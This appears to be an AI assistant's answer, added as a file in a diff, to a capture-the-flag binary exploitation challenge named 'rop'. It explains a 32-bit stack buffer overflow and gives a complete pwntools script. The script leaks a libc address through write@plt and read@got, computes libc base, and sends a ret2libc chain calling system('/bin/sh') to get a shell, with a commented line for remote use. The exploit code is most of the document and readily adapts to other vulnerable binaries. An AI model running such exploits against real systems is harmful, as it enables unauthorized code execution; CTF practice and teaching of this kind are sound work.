@@ -1,0 +1,115 @@
+To solve this challenge using `pwntools`, you will need to perform a Return-Oriented Programming (ROP) attack. The goal is to exploit the buffer overflow in the `vulnerable_function` to control the program's execution flow and eventually execute a system call (e.g., `system("/bin/sh")`) to get a shell.
+
+Here are the steps and the corresponding code:
+
+---
+
+### Steps to Solve the Challenge
+
+1. **Analyze the Binary**:
+   - The binary is a 32-bit ELF file.
+   - The `vulnerable_function` has a buffer overflow vulnerability because it reads 256 bytes (`0x100`) into a buffer of size 136 bytes (`buf[136]`).
+   - This allows us to overwrite the saved return address on the stack.
+
+2. **Leak libc Base Address**:
+   - Use the `write` function to leak the address of a libc function (e.g., `read`) from the Global Offset Table (GOT).
+   - Calculate the base address of libc using the leaked address and the offset of the function in libc.
+
+3. **Build ROP Chain**:
+   - Use the libc base address to calculate the address of `system` and `/bin/sh`.
+   - Build a ROP chain to call `system("/bin/sh")`.
+
+4. **Exploit**:
+   - Send the payload to the binary to execute the ROP chain and get a shell.
+
+---
+
+### Code to Solve the Challenge
+
+Here is the Python code using `pwntools`:
+
+```python
+from pwn import *
+
+# Set up the binary and libc
+binary = './rop'
+elf = ELF(binary)
+libc = ELF('./libc.so.6')
+
+# Start the process or connect to the remote server
+p = process(binary)
+# p = remote('challenge.server.com', 1337)  # Uncomment for remote exploitation
+
+# Gadgets and addresses
+vuln_func = elf.symbols['vulnerable_function']
+write_plt = elf.plt['write']
+read_got = elf.got['read']
+main_addr = elf.symbols['main']
+
+# Step 1: Leak libc address
+log.info("Leaking libc address...")
+payload = b'A' * 136  # Overflow buffer
+payload += p32(write_plt)  # Call write@plt
+payload += p32(main_addr)  # Return to main after leaking
+payload += p32(1)  # File descriptor (stdout)
+payload += p32(read_got)  # Address to leak (read@got)
+payload += p32(4)  # Number of bytes to write (size of address)
+
+p.sendline(payload)
+leaked_read = u32(p.recv(4))  # Receive 4 bytes (leaked address)
+log.success(f"Leaked read@libc: {hex(leaked_read)}")
+
+# Step 2: Calculate libc base and system address
+libc_base = leaked_read - libc.symbols['read']
+log.success(f"Libc base address: {hex(libc_base)}")
+
+system_addr = libc_base + libc.symbols['system']
+bin_sh_addr = libc_base + next(libc.search(b'/bin/sh'))
+log.success(f"system@libc: {hex(system_addr)}")
+log.success(f"/bin/sh string: {hex(bin_sh_addr)}")
+
+# Step 3: Build final ROP chain
+log.info("Building final payload...")
+payload = b'A' * 136  # Overflow buffer
+payload += p32(system_addr)  # Call system
+payload += p32(0xdeadbeef)  # Return address (dummy)
+payload += p32(bin_sh_addr)  # Argument to system ("/bin/sh")
+
+# Step 4: Send final payload
+p.sendline(payload)
+
+# Step 5: Interact with the shell
+p.interactive()
+```
+
+---
+
+### Explanation of the Code
+
+1. **Setup**:
+   - Load the binary and libc using `pwntools`.
+   - Identify the addresses of key functions (`write`, `read`, `main`, etc.) and the GOT entry for `read`.
+
+2. **Leaking libc Address**:
+   - Overflow the buffer in `vulnerable_function` to overwrite the return address.
+   - Use a ROP chain to call `write(1, read@got, 4)` to leak the address of `read` from the GOT.
+   - Calculate the libc base address using the leaked address and the offset of `read` in libc.
+
+3. **Building the Final ROP Chain**:
+   - Calculate the addresses of `system` and `/bin/sh` using the libc base address.
+   - Build a ROP chain to call `system("/bin/sh")`.
+
+4. **Exploitation**:
+   - Send the final payload to execute the ROP chain and spawn a shell.
+   - Interact with the shell using `p.interactive()`.
+
+---
+
+### Notes
+
+- Make sure the libc file (`libc.so.6`) matches the one used by the binary.
+- If exploiting remotely, replace `process(binary)` with `remote(host, port)`.
+- Use `checksec` to verify the binary's protections (e.g., NX, PIE, etc.).
+- If ASLR is enabled, you may need to leak additional addresses or brute-force offsets.
+
+This code should work for the given challenge. Let me know if you need further clarification!
